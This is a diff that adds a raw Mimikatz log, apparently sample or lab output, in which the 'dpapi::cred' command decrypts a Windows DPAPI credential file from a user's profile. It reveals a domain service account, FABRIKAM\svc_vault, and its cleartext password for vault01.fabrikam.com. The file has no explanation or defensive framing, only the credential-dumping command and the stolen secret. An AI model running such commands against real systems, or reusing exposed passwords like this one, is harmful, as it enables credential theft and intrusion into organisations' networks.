@@ -1,0 +1,33 @@
+mimikatz # dpapi::cred /in:"C:\Users\mwong\AppData\Local\Microsoft\Credentials\A1F4C9E82B3D4E5A9C8B7F6E5D4C3B2A"
+
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {7e6b5d4c-3a2e-1f0d-9c8b-7a6f5e4d3c2b}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Local Credential Data
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : c5d6e7f80912a3b4c5d6e7f809182b3c
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwDataLen          : 000000b0 - 176
+  pbData             : 2b3c4d5e6f708192a3b4c5d6e7f80912b3c4...
+  dwSignLen          : 00000040 - 64
+  pbSign             : 8e7d6c5b4a39281706f5e4d3c2b1a0f9...
+
+Decrypting Credential:
+ * masterkey     : 4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a09182736450...
+
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000ba - 186
+  Type           : 00000002 - 2 - domain_password
+  LastWritten    : 5/22/2026 3:07:19 PM
+  Persist        : 00000003 - 3 - enterprise
+  TargetName     : Domain:target=vault01.fabrikam.com
+  UserName       : FABRIKAM\svc_vault
+  CredentialBlob : V@ult-Svc-Fabrikam-2026!
